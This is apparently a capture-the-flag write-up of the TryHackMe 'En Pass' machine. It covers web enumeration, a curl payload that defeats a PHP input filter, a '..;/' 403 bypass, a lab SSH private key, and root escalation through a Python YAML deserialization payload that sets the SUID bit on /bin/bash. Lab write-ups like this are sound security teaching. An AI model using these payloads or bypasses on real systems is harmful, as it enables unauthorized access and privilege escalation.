---
title: "En Pass : TryHackMe"
last_modified_at: 2021-02-13
categories:
  - TryHackMe
author_profile: false
tags:
  - 403Bypass
  - Privilege Escalation
  - linux 
  - enumeration
  - TryHackMe
---
# En_Pass

Get what you can't.

![/assets/images/TryHackMe/en_pass/Untitled.png](/assets/images/TryHackMe/en_pass/Untitled.png)

# Enumerating the machine

## Nmap

```bash
**$ nmap 10.10.54.216 --min-rate=3000 -p- -sV**
Starting Nmap 7.60 ( https://nmap.org ) at 2021-02-13 01:37 +0545
Nmap scan report for 10.10.54.216
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds

```

## Port 8001

It has a web server running

![/assets/images/TryHackMe/en_pass/Untitled%201.png](/assets/images/TryHackMe/en_pass/Untitled%201.png)

There is not much on the main page.

### Enumerating the web service

```bash
$ gobuster dir -u http://10.10.54.216:8001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sql,db,swp,py -t 30 -o gobuster
#results
/web (Status: 301)
/index.html (Status: 200)
/reg.php (Status: 200)
/403.php (Status: 403)
/zip (Status: 301)
/server-status (Status: 403)
```

The first flag is the path needed. The initial path is of three letter checking /web

![/assets/images/TryHackMe/en_pass/Untitled%202.png](/assets/images/TryHackMe/en_pass/Untitled%202.png)

Now again using dirbuster on $IP:8001/web we get to the final path

```bash
/web/resources/infoseek/configure/key
```

This path has a ssh key which is encrypted

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
9plhOtJX6ZUjtq92E/sinTG0wwc94VmwiA5lvGmjUtBjah4epDJs8Vt/tIpSTg8k
28ef1Q8+5+Kl4alJZWNF0RVpykVEXKqYw3kJBqQDTa4aH75MczJGfk4TY5kdZFO3
tPVajm46V2C/9OrjOpEVg2jIom+e4kJAaJdB7Jr7br3xoaYhe5YEUiSGM8YD7SUZ
azrAFkIoZ72iwdeVGR7CWgdwmDWw/nFvg6Ug/fsAGobDCf2CtwLEUtLL/XMpLvEb
AS0Wic1zPjCCGaVSyijImrh3beYgWbZzz7h5gmqfoycVKS4S+15tFZBZRA0wH05m
XfDw6It7ZZtP73i8XoOAg1gAbv6o/vR3GkF798bc0fV4bGJrpQ9MIEpOphR1SNuI
x0gjtCfIyYjwJmwlWeNmELyDAO3oIxYZBSydHko0EUBnbeOw+Jj3xvEdNO3PhZ7G
3UPIoZMH4KAdcXy15tL0MYGmXyOx+oHuDEPNHxkR3+lJ1C+BXJwtrSXU+qz9u/Sz
qavHdwzxc8+HiiWcGxN3LEdgfsKg/TKXA5X/TE7DnjVmhsL4IBCOIyPxF8ClXok7
YMwNymz269J85Y73gemMfhwvGC18dNs0xfYEMUtDWbrwJDsTezdBmssMvOHSjpr5
w+Z+sJvNabMIBVaQs+jqJoqm8EARNzA40CBQUJJdmqBfPV/xSmHzNOLdTspOShQN
5iwP3adKdq+/TCp2l8SaXQedMIf6DCPmcuUVrYK4pjAr7NzFVNUgqbYLT1J0thGr
gQBk+0RlQadN7m7BW835YeyvN0GKM35f7tUylJHcfTdjE832zB24iElDW483FvJy
RhM+bOBts0z+zVUx0Ua+OEM1sxwAAlruur4+ucCPFV1XrWYWfLo3VXvTbhPiZcXF
fmOJKaFxBFjbARQMR0IL5CH8tPz2Kbeaepp2sUZcgDZSHWAbvg0j8QVkisJJ/H7G
Vg6MdIRf+Ka9fPINxyrWnxDoIVqP5/HyuPjrmRN9wMA8lWub8okH9nlJoss3n8j5
xom80wK197o29NN6BWEUuagXSHdnU2o+9L991kScaC9XXOuRgqFrDRFBUUn1VOWJ
3p+lTLNscC+eMP0Be3U6R85b/o3grdb610A1V88pnDWGYa/oVgXelUh1SsHA0tuI
om679j9qdIP7O8m3PK0Wg/cSkjdj0vRxT539tAY1+ci99FXnO1Touo7mlaA4eRTK
LQLmzFcucQODcm3FEy18doT2llDTyloD2PmX+ipzB7mbdqw7pUXPyFTnGZoKrnhM
27L629aKxoM19Mz0xP8BoQMcCOCYklIw1vkaiPgXAYkNXXtBzwWn1SFcU57buaED
CJCnh3g19NZ/VjJ1zERJLjK1U1l/RtlejISAB35AYFUnKDG3iYXLRP3iT/R22BMd
z4uSYN10O1nr4EppAOMtdSdd9PJuwxKN/3nJvymMf3O/MmC/8DJOIyadZzEw7EbP
iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
-----END RSA PRIVATE KEY-----
```

![/assets/images/TryHackMe/en_pass/Untitled%203.png](/assets/images/TryHackMe/en_pass/Untitled%203.png)

So we need to find the key

Lets have a look at other paths

/zip has a collection of zip files

![/assets/images/TryHackMe/en_pass/Untitled%204.png](/assets/images/TryHackMe/en_pass/Untitled%204.png)

It is upto `a100.zip`

Let's download the files

```bash
for i in {0..100};do                                                                                                                                                                                        ─╯
wget http://10.10.54.216:8001/zip/a$i.zip
done
```

Let's check if all the files are same or different

```bash
$ sha1sum *.zip | head
2dc63abd2850d01526cad099c542bf8a196a987f  a0.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a100.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a10.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a11.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a12.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a13.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a14.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a15.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a16.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a17.zip
```

Filtering out the files with same hash

```bash
$ sha1sum *.zip | grep -v 311ac6af58972cab0606ce098445ce3ba1227f09
2dc63abd2850d01526cad099c542bf8a196a987f  a0.zip
```

On extracting all the zip files, we find a file named `a` which has the content

```bash
sadman
```

Tried this as password but no luck.

/reg.php

[]()

The source code has the following code

```bash
<h4 style='color:rgb(83, 21, 165);'> <?php
     

if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          
          
          }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";

        
            
            }
            

                    else{

                      echo "  Try Try!!";

                
                    }
          }
        
          else{

            echo "  Try Again!! ";

      
          }     
 
  }

 
?>
```

We can run the `echo $result` with the following payload

```bash
curl -XPOST http://10.10.54.216:8001/reg.php -d 'title="",",",","","""","",""""""","""'
```

It basically forbids the alphanumeric characters and The input is first splitted by `,` and array is created from the splitted string. It checks for some equal strings on some indexes. The above payload bypasses the code and we get a string 

```bash
Nice. Password : cimihan_are_you_here?
```

The password `cimihan_are_you_here?` is the passphrase to the ssh key. Now we need to find the username.

The SSH service has a user enumeration vulnerability. I tried running it on a wordlist (Names.txt on seclists ) but could not find the user.

## This took me a lot of time to figure out.

/403.php 

403.php page was not shown when accessing /web so there must be something here.

![/assets/images/TryHackMe/en_pass/Untitled%205.png](/assets/images/TryHackMe/en_pass/Untitled%205.png)

Used [403Fuzzer](https://github.com/intrudir/403fuzzer) to bypass the 403 pages.

It showed that the page could be bypassed

```bash
curl http://10.10.54.216:8001/403.php/..;/
```

On running this we get

```bash
Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.
```

Let's ssh into the machine

## User Flag

![/assets/images/TryHackMe/en_pass/Untitled%206.png](/assets/images/TryHackMe/en_pass/Untitled%206.png)

We get the user flag.

## Root Flag

While manually enumerating the machine I found scripts on /opt

```bash
-r-xr-xr-x 1 root root 250 Jan 31 19:40 /opt/scripts/file.py
```

```bash
#!/usr/bin/python
import yaml

class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())
```

Let's look as ps command

```bash
$ ps -aux | grep cron
root       935  0.0  0.6  27724  3016 ?        Ss   19:50   0:00 /usr/sbin/cron -f
imsau     1711  0.0  0.2  12912  1012 pts/0    S+   20:20   0:00 grep cron
```

I found just this script run owned by root and ps shows cron running, so didn't bother running pspy.

For the privilege escalation we need to create a yml file. [This](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf) pdf has all the information needed to create the exploit. So the payload which I used 

```bash
!!python/object/apply:os.system ["chmod +x /bin/bash"]
```

After a while /bin/bash has a suid bit set using that we can get root shell

![/assets/images/TryHackMe/en_pass/Untitled%207.png](/assets/images/TryHackMe/en_pass/Untitled%207.png)

# Vulnerable code

Let's have a look at why the bypass worked.

```bash
function urlPath(){ 
        global $host;
        $server_port = $_SERVER['SERVER_PORT'];
        $server_protocol = $_SERVER['HTTPS'];
        $path = $_SERVER['REQUEST_URI'];
        $host = $_SERVER['HTTP_HOST'];

        if ($server_port == 443 || (!empty($server_protocol) && $server_protocol !='off' )){

            $protocol = "https://";    

        }
        else {

            $protocol ="http://";
        
        }

        $url = $protocol.$host.$path;
        return $url;
        

    }

$url_path = urlPath();
**$bypass_url = "http://$host/403.php/..;/" ;**

if ( $url_path === $bypass_url){

    echo "<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>";

}
else {

    header('HTTP/1.1 403 Forbidden');  
    echo '
    
    <div class="items">
        <div class="txt">
             <h2>403<h2>
        </div>
        <div class="txt2">
            <h2>Forbidden<h2>
        </div>
        <div class="txt1">
            <h1>What are you looking for? <h1>
        </div>
        

    </div>
      
            ';

}

?>
```

The creator of the machine hardcoded the bypass url. This was a bit disappointing

```bash
**$bypass_url = "http://$host/403.php/..;/" ;**
```

The 403.php bypass was the most frustrating also the most exciting. I learnt so many possible ways that could be used against the forbidden files to access them.  I learnt about python YAML deserialization exploit. The 403.php bypass led to search a lot on how to bypass.